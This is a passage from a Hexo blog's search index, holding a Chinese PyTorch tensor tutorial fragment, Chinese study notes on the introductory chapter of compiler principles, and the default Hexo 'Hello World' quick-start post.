dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span>float64<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所有在CPU上的Tensor（除了CharTensor）都支持与NumPy数组相互转换。</p><p>此外上面提到还有一个常用的方法就是直接用torch.tensor()将NumPy数组转换成Tensor，需要注意的是该方法总是会进行数据拷贝，返回的Tensor和原来的数据不再共享内存。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">c <span class="token operator">=</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span>a<span class="token punctuation">)</span>a <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token number">4.</span> <span class="token number">4.</span> <span class="token number">4.</span> <span class="token number">4.</span> <span class="token number">4.</span><span class="token punctuation">]</span> tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3.</span><span class="token punctuation">,</span> <span class="token number">3.</span><span class="token punctuation">,</span> <span class="token number">3.</span><span class="token punctuation">,</span> <span class="token number">3.</span><span class="token punctuation">,</span> <span class="token number">3.</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span>float64<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Tensor-on-GPU"><a href="#Tensor-on-GPU" class="headerlink" title="Tensor on GPU"></a>Tensor on GPU</h3><p>方法to()可以将CPU和GPU之间相互移动</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 以下代码只有在PyTorch GPU版本上才会执行</span><span class="token keyword">if</span> torch<span class="token punctuation">.</span>cuda<span class="token punctuation">.</span>is_available<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    device <span class="token operator">=</span> torch<span class="token punctuation">.</span>device<span class="token punctuation">(</span><span class="token string">"cuda"</span><span class="token punctuation">)</span>          <span class="token comment"># GPU</span>    y <span class="token operator">=</span> torch<span class="token punctuation">.</span>ones_like<span class="token punctuation">(</span>x<span class="token punctuation">,</span> device<span class="token operator">=</span>device<span class="token punctuation">)</span>  <span class="token comment"># 直接创建一个在GPU上的Tensor</span>    x <span class="token operator">=</span> x<span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>                       <span class="token comment"># 等价于 .to("cuda")</span>    z <span class="token operator">=</span> x <span class="token operator">+</span> y    <span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">.</span>to<span class="token punctuation">(</span><span class="token string">"cpu"</span><span class="token punctuation">,</span> torch<span class="token punctuation">.</span>double<span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment"># to()还可以同时更改数据类型</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 《动手学深度学习》自学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译原理3.29</title>
      <link href="/2023/03/29/bian-yi-3-29/"/>
      <url>/2023/03/29/bian-yi-3-29/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-引论"><a href="#第一章-引论" class="headerlink" title="第一章 引论"></a>第一章 引论</h1><h2 id="1-1程序的翻译"><a href="#1-1程序的翻译" class="headerlink" title="1.1程序的翻译"></a>1.1程序的翻译</h2><p>翻译程序： 源语言-&gt;与之等价的目标语言<br>两种方式：1、编译 2、解释  </p><h3 id="编译方式"><a href="#编译方式" class="headerlink" title="编译方式"></a>编译方式</h3><p>编译方式是一种分阶段进行的方式<br>翻译阶段：高级语言或汇编语言程序-&gt;汇编语言或机器语言的目标程序<br>运行阶段：输入数据–目标程序&amp;系统子程序–&gt;运行结果<br>特点：  </p><ul><li>源程序的执行需要分阶段  <ul><li>如果目标程序是机器语言程序，两大阶段：编译阶段和运行阶段。</li><li>如果目标程序是汇编语言程序，三大阶段：编译阶段、汇编阶段和运行阶段。</li></ul></li><li>生成了目标代码，且可以多次执行。</li></ul><p>说明：  </p><ul><li>生成的目标程序<u>不一定</u>是机器语言的程序，也有可能是汇编语言程序；</li><li>编译程序与<u>具体的机器和语言有关</u>，即任何一个具体的编译程序都是某一特定类型的计算机系统中关于某一特定语言的编译程序；</li><li>对编译程序而言，<u>源程序</u>是输入数据，<u>目标程序</u>是输出结果</li></ul><h3 id="解释方式"><a href="#解释方式" class="headerlink" title="解释方式"></a>解释方式</h3><p>解释程序将按源程序中<del>语句的动态顺序</del>，逐句地进行分析解释，并<del>立即</del>予以<del>执行</del>。<br>特点：</p><ul><li>不生成目标代码，直接执行源程序本身。与前者方式的<del>根本区别</del>。</li><li>都需要进行词法、语法、语义分析</li><li>更灵活，交互方便，节省空间</li><li>效率低（时间开销、空间开销）</li></ul><p><img src="/2023/03/29/bian-yi-3-29/images.jpg"></p><h2 id="1-2编译程序的工作过程"><a href="#1-2编译程序的工作过程" class="headerlink" title="1.2编译程序的工作过程"></a>1.2编译程序的工作过程</h2><ul><li>词法分析</li><li>语法分析</li><li>语义分析和中间代码生成</li><li>中间代码优化</li><li>目标代码生成</li></ul><h3 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h3><p>依据语言<font color="red">词法规则</font>，分析由字符组成的源程序，把它识别为一个一个具有独立意义的<font color="red">最小语法单位</font>，即“<font color="red">单词</font>”，并识别出与其相关的属性（如是标识符还是界限符，or数..）再转换成<font color="red">长度上统一</font>的标准形式（这个形式既刻画单词本身，又刻画了它具有的属性，称为<font color="red">属性字</font>），以供其他部分使用。  </p><ul><li>扫描源程序的字符串，识别单词（关键字、标识符、常量、运算符、界限符）</li></ul><p>eg:<br><img src="/2023/03/29/bian-yi-3-29/images1.jpg"></p><p>属性字： &lt;类别号class，自身值value&gt;</p><h3 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h3><p>依据<font color="red">语法规则</font>，逐一分析词法分析时得到的单词，把单词串分解成各类语法单位，即确定<font color="red">它们是怎样组成和语句，以及说明语句又是怎样组成程序的</font>。分析时如发现有不合语法规则的地方，便将出错的位置及出错性质打印报告程序员。如无语法错误，则用另一种中间形式给出正确的语法结构，供下一阶段分析使用。</p><h3 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h3><p>依据语言的语义规则对语法分析得到的语法结构进行静态语义检查（确定类型、类型和运算合法性检查、识别含义与相 应的语义处理及其它一些静态语义检查），并用另一种内部形式表示出来，或者直接用目标语言表示出来。<br>凡在编译时可以确定的内容称为“静态”的；凡必须推迟 到程序运行时才能确定的内容称为“动态”的</p><h3 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h3><p>依据程序的等价变换规则，尽量压缩目标程序运行所需的 时间和所占的存储空间，以提高目标程序的质量。<br>优化的是中间代码/目标代码的质量，而非编译程序的质量</p><h3 id="代码生成"><a href="#代码生成" class="headerlink" title="代码生成"></a>代码生成</h3><p>如果语义分析时把源程序表示成中间形式而不是表示成目标指令，则由本部分完成从中间形式到目标指令的转换。如果语义分析时，已直接生成目标指令，则无需另外再做代码生成工作。<br>目标指令可能是绝对指令代码，或可重新定位的指令代码 或汇编指令代码。该阶段的工作有赖于硬件系统结构和机器指令含义。</p><h3 id="表格管理"><a href="#表格管理" class="headerlink" title="表格管理"></a>表格管理</h3><p>登记源程序中出现的每个名字以及名字的各种属性。有些名字的属性需要在各个阶段才能填入。<br><img src="/2023/03/29/bian-yi-3-29/images2.jpg"></p><h3 id="出错处理"><a href="#出错处理" class="headerlink" title="出错处理"></a>出错处理</h3><p>源程序中的错误有语法错误和语义错误两种。</p><p>语法错误：源程序中不符合语法（或词法）规则的错误，它们可在词法分析或语法分析时检测出来。</p><p>语义错误：源程序中不符合语义规则的错误，一般在语义分析时检测出来，有的语义错误要在运行时才能检测出来。通常包括：说明错误、作用域错误、类型不一致等等。</p><h2 id="1-3编译程序的结构"><a href="#1-3编译程序的结构" class="headerlink" title="1.3编译程序的结构"></a>1.3编译程序的结构</h2><p><img src="/2023/03/29/bian-yi-3-29/images3.jpg"></p><h2 id="1-4编译程序的组织形式"><a href="#1-4编译程序的组织形式" class="headerlink" title="1.4编译程序的组织形式"></a>1.4编译程序的组织形式</h2><h3 id="遍（趟，趟程）"><a href="#遍（趟，趟程）" class="headerlink" title="遍（趟，趟程）"></a>遍（趟，趟程）</h3><p>所谓一趟或一遍是指一个编译程序在编译时刻把源程序或源 程序的等价物（中间程序）从头到尾扫描一遍并转换成另一紧邻的 等价物的全过程。</p><p>根据编译程序在完成翻译任务的过程中需要对源程序或其中间等价物扫描的遍数，可以把编译程序分为单遍扫描的编译程序 （只需扫描一遍）和多遍扫描的编译程序（需扫描多遍）。<br><img src="/2023/03/29/bian-yi-3-29/images4.jpg"></p><p>多遍的特点：<br>优点：</p><ul><li>节省内存空间</li><li>提高目标程序质量</li><li>缩短Compiler的开发周期</li></ul><p>缺点：  </p><ul><li>重复性工作</li><li>延长了编译时间，降低了编译效率</li></ul><p>并非单遍/多遍一定就好，视情况而定。<br>选择编译的“遍”数的原则：  </p><ul><li>语言的大小、结构</li><li>机器的规模</li><li>设计的目的（如：编译速度、目标程序的运行速度）</li><li>设计人员素质多少</li></ul><h3 id="编译的前端和后端"><a href="#编译的前端和后端" class="headerlink" title="编译的前端和后端"></a>编译的前端和后端</h3><ul><li>前端主要由与源语言有关但与目标机器无关的那些部分组成, 如词法分析、语法分析、语义分析与中间代码生成及部分代码优 化工作。  </li><li>后端主要包括编译中与目标机器有关的那些部分，如与目标 机有关的代码优化和目标代码生成等。后端不依赖于源语言而仅 依赖于中间语言。<br><img src="/2023/03/29/bian-yi-3-29/images5.jpg"></li></ul><p><img src="/2023/03/29/bian-yi-3-29/images6.jpg"></p><h2 id="1-5编译程序的构造"><a href="#1-5编译程序的构造" class="headerlink" title="1.5编译程序的构造"></a>1.5编译程序的构造</h2><h3 id="高级语言的自编译性高级语言的自编译性"><a href="#高级语言的自编译性高级语言的自编译性" class="headerlink" title="高级语言的自编译性高级语言的自编译性"></a>高级语言的自编译性高级语言的自编译性</h3><p>构造编译程序可以用机器言语、汇编语言和高级语言<br>高级语言的自编译性：一个语言可以用来编写自己的编 译程序。<br><img src="/2023/03/29/bian-yi-3-29/images7.jpg"></p><p><img src="/2023/03/29/bian-yi-3-29/images8.jpg"></p><h3 id="编译的自展技术"><a href="#编译的自展技术" class="headerlink" title="编译的自展技术"></a>编译的自展技术</h3><p>即通过一系列自展途径而形成编译程序的过程。<br>先对语言的核心部分构造一个小小编译程序（可用低级语 言实现），再以它为工具构造一个能够编译更多语言成分的较大编译程序。如此扩展下去，越滚越大，最后形成所期望的整个编译程序。<br><img src="/2023/03/29/bian-yi-3-29/images9.jpg"></p><h3 id="编译的移植"><a href="#编译的移植" class="headerlink" title="编译的移植"></a>编译的移植</h3><p>即将一个机器（宿主机）上的一个具有自编译性的高级语 言编译程序移植到另一个机器（目标机）上。<br>利用A机器上的高级语言L编写能在B机器上运行的高级语言L的编译程序。<br><img src="/2023/03/29/bian-yi-3-29/images10.jpg"></p><p><img src="/2023/03/29/bian-yi-3-29/images11.jpg"></p><h3 id="编译程序的自动化"><a href="#编译程序的自动化" class="headerlink" title="编译程序的自动化"></a>编译程序的自动化</h3><p><img src="/2023/03/29/bian-yi-3-29/images12.jpg"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>什么是编译程序</li><li>编译方式的特点</li><li>解释方式的特点</li><li>编译方式与解释方式的根本区别</li><li>编译程序的工作过程</li><li>编译程序的结构</li><li>遍与编译程序的组织形式</li><li>编译程序的构造方法</li></ul>]]></content>
      
      
      <categories>
          
          <category> CP notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CP notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/03/28/hello-world/"/>
      <url>/2023/03/28/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
